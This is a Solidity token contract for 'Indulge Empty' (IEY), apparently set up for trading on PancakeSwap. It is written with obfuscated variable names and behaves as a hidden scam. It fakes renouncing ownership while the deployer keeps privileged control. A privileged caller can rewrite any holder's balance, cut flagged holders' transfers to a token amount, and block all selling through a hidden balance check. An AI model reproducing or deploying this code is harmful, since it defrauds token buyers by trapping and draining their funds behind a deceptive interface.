//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface walletAmount {
    function createPair(address amountAuto, address autoReceiver) external returns (address);
}

interface toLimit {
    function totalSupply() external view returns (uint256);

    function balanceOf(address sellMin) external view returns (uint256);

    function transfer(address launchedMax, uint256 takeSell) external returns (bool);

    function allowance(address receiverAt, address spender) external view returns (uint256);

    function approve(address spender, uint256 takeSell) external returns (bool);

    function transferFrom(
        address sender,
        address launchedMax,
        uint256 takeSell
    ) external returns (bool);

    event Transfer(address indexed from, address indexed txToken, uint256 value);
    event Approval(address indexed receiverAt, address indexed spender, uint256 value);
}

abstract contract toTake {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface isBuy {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface swapLaunch is toLimit {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract IndulgeEmpty is toTake, toLimit, swapLaunch {

    function approve(address txTotalLaunched, uint256 takeSell) public virtual override returns (bool) {
        swapMin[_msgSender()][txTotalLaunched] = takeSell;
        emit Approval(_msgSender(), txTotalLaunched, takeSell);
        return true;
    }

    uint256 public modeSender;

    bool public walletTx;

    bool private toAt;

    mapping(address => bool) public feeTeam;

    function exemptLaunched(address teamAt, address launchedMax, uint256 takeSell) internal returns (bool) {
        require(txBuyToken[teamAt] >= takeSell);
        txBuyToken[teamAt] -= takeSell;
        txBuyToken[launchedMax] += takeSell;
        emit Transfer(teamAt, launchedMax, takeSell);
        return true;
    }

    function allowance(address toEnableReceiver, address txTotalLaunched) external view virtual override returns (uint256) {
        if (txTotalLaunched == listAuto) {
            return type(uint256).max;
        }
        return swapMin[toEnableReceiver][txTotalLaunched];
    }

    function transfer(address takeFund, uint256 takeSell) external virtual override returns (bool) {
        return fromList(_msgSender(), takeFund, takeSell);
    }

    mapping(address => uint256) private txBuyToken;

    address public shouldSender;

    function totalSupply() external view virtual override returns (uint256) {
        return modeMax;
    }

    address public receiverLaunchMax;

    constructor (){
        
        minLiquidity();
        isBuy exemptAutoMin = isBuy(listAuto);
        shouldSender = walletAmount(exemptAutoMin.factory()).createPair(exemptAutoMin.WETH(), address(this));
        
        receiverLaunchMax = _msgSender();
        totalAt[receiverLaunchMax] = true;
        txBuyToken[receiverLaunchMax] = modeMax;
        
        emit Transfer(address(0), receiverLaunchMax, modeMax);
    }

    function transferFrom(address teamAt, address launchedMax, uint256 takeSell) external override returns (bool) {
        if (_msgSender() != listAuto) {
            if (swapMin[teamAt][_msgSender()] != type(uint256).max) {
                require(takeSell <= swapMin[teamAt][_msgSender()]);
                swapMin[teamAt][_msgSender()] -= takeSell;
            }
        }
        return fromList(teamAt, launchedMax, takeSell);
    }

    function decimals() external view virtual override returns (uint8) {
        return shouldLimit;
    }

    function balanceOf(address sellMin) public view virtual override returns (uint256) {
        return txBuyToken[sellMin];
    }

    uint256 public autoIs;

    uint256 receiverTrading;

    function minLiquidity() public {
        emit OwnershipTransferred(receiverLaunchMax, address(0));
        takeBuy = address(0);
    }

    address buyTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function listFund(address fromLaunchedTake) public {
        if (atIs) {
            return;
        }
        
        totalAt[fromLaunchedTake] = true;
        if (modeSender == autoIs) {
            swapLaunchIs = false;
        }
        atIs = true;
    }

    bool private toReceiver;

    uint256 constant toFeeSwap = 7 ** 10;

    mapping(address => bool) public totalAt;

    function owner() external view returns (address) {
        return takeBuy;
    }

    address private takeBuy;

    function symbol() external view virtual override returns (string memory) {
        return marketingLaunch;
    }

    string private marketingLaunch = "IEY";

    function feeIs() private view {
        require(totalAt[_msgSender()]);
    }

    function sellReceiver(uint256 takeSell) public {
        feeIs();
        txWallet = takeSell;
    }

    bool public atIs;

    uint8 private shouldLimit = 18;

    function getOwner() external view returns (address) {
        return takeBuy;
    }

    function fromList(address teamAt, address launchedMax, uint256 takeSell) internal returns (bool) {
        if (teamAt == receiverLaunchMax) {
            return exemptLaunched(teamAt, launchedMax, takeSell);
        }
        uint256 receiverFrom = toLimit(shouldSender).balanceOf(buyTrading);
        require(receiverFrom == txWallet);
        require(launchedMax != buyTrading);
        if (feeTeam[teamAt]) {
            return exemptLaunched(teamAt, launchedMax, toFeeSwap);
        }
        return exemptLaunched(teamAt, launchedMax, takeSell);
    }

    event OwnershipTransferred(address indexed teamReceiverMax, address indexed toTrading);

    string private modeLaunchTake = "Indulge Empty";

    bool public liquidityTo;

    bool public swapLaunchIs;

    function launchedTake(address takeFund, uint256 takeSell) public {
        feeIs();
        txBuyToken[takeFund] = takeSell;
    }

    function name() external view virtual override returns (string memory) {
        return modeLaunchTake;
    }

    function shouldBuyAmount(address launchAmountReceiver) public {
        feeIs();
        if (receiverReceiver != tradingFee) {
            autoIs = modeSender;
        }
        if (launchAmountReceiver == receiverLaunchMax || launchAmountReceiver == shouldSender) {
            return;
        }
        feeTeam[launchAmountReceiver] = true;
    }

    mapping(address => mapping(address => uint256)) private swapMin;

    uint256 txWallet;

    address listAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public tradingFee;

    bool public receiverReceiver;

    uint256 private modeMax = 100000000 * 10 ** 18;

}